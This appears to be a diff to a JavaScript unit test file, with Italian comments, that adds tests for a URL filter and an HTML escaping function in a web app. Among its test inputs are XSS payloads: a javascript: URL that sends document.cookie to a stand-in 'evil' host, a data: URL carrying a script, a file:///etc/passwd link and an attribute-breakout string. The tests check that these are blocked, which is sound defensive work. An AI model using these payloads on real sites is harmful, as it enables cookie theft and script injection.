@@ -1,7 +1,7 @@
 /* Funzioni pure di Orchestre: si provano in Node senza browser né rete. */
 import test from "node:test";
 import assert from "node:assert/strict";
-import { esc, roleLabel, isStaff, fmtDate, errMsg } from "../src/ui.js";
+import { esc, roleLabel, isStaff, fmtDate, errMsg, safeHttpUrl } from "../src/ui.js";
 import { nextUrl } from "../src/auth.js";
 
 test("esc neutralizza i quattro caratteri pericolosi e tollera null", () => {
@@ -57,4 +57,27 @@ test("nextUrl accetta solo percorsi interni a /orchestre, mai il login, mai host
   assert.equal(nextUrl("javascript:alert(1)"), "/orchestre/admin/");
   assert.equal(nextUrl("/orchestre/admin/ x"), "/orchestre/admin/");
   assert.equal(nextUrl("/orchestre\\evil"), "/orchestre/admin/");
+});
+
+test("safeHttpUrl lascia passare solo http e https", () => {
+  /* Il campo «Sito o pagina» è un <input type="url">, che accetta javascript: come URL valida.
+     Quel link lo apre lo staff dalla scheda della candidatura: deve restare inerte. */
+  assert.equal(safeHttpUrl("javascript:fetch('//evil/'+document.cookie)"), "");
+  assert.equal(safeHttpUrl("JavaScript:alert(1)"), "");
+  assert.equal(safeHttpUrl("  javascript:alert(1)  "), "");
+  assert.equal(safeHttpUrl("data:text/html,<script>alert(1)</script>"), "");
+  assert.equal(safeHttpUrl("vbscript:msgbox"), "");
+  assert.equal(safeHttpUrl("file:///etc/passwd"), "");
+  assert.equal(safeHttpUrl("https://example.org/x?a=1"), "https://example.org/x?a=1");
+  assert.equal(safeHttpUrl("http://example.org/"), "http://example.org/");
+  assert.equal(safeHttpUrl("example.org"), "");  /* senza schema non è un indirizzo assoluto: resta testo */
+  assert.equal(safeHttpUrl(null), "");
+  assert.equal(safeHttpUrl(""), "");
+});
+
+test("esc neutralizza anche l'apice singolo", () => {
+  /* Un attributo scritto con apici singoli è legittimo in HTML: se esc non copre l'apice,
+     `<b title='...'>` si chiude da dentro. */
+  assert.equal(esc("l'ho fatto"), "l&#39;ho fatto");
+  assert.equal(esc("' onmouseover=alert(1) x='"), "&#39; onmouseover=alert(1) x=&#39;");
 });
